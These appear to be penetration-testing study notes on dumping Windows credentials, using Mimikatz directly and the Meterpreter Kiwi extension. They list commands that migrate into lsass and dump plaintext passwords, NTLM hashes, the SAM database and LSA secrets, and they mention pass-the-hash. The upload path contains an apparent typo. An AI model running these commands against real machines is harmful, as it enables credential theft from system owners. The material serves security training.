Mimikatz is a Windows post exploit tool that allows for the extraction of plaintext creds from memory, password hashes from local SAM and more.

The SAM database is a database file on a Windows systems that stores user passwords and can be used to authenticate users both locally and remotely.

We can utilize the pre-built mimikatz executable alternatively if we have access to a meterpreter session on a Windows target, we can utilizte the inbuilt meterpreter extension Kiwi.

Kiwi allows us to dynamically execute Mimikatz on the target system without touching the disk.


**ensure for any exploits you use, you set target and auto tab completion to see options**
**after we gain access to machine**
sysinfo (check that the architecture and meterpreter matches x86 and x86 etc, if it doesnt then use ps and find on to migrate to)
**for dumping hashes we will migrate to the lsass service, if you cant find the ID just do pgrep lsass and then migrate<id>**

load kiwi
help (shows commands)
creds_all (dumps all creds)
lsa_dump_sam (dumps sam database)
lsa_dump_secrets

**we can use the ntlm hashes to do a passthehash attack and it is also possible to find clear text passwords doing this**
**we can also upload mimikatz directly to the target system and run commands via command prompt**

upload/usr/share/windows-resources/mimikatz/x65/mimikatz.exe
shell (opens a cmd prompt)
.\mimikatz.exe (runs mimikatz on the target machine via command prompt)
privilege::debug (checks for appropriate privs, '20' OK is good
sekurlsa::logonpasswords
lsadump::sam
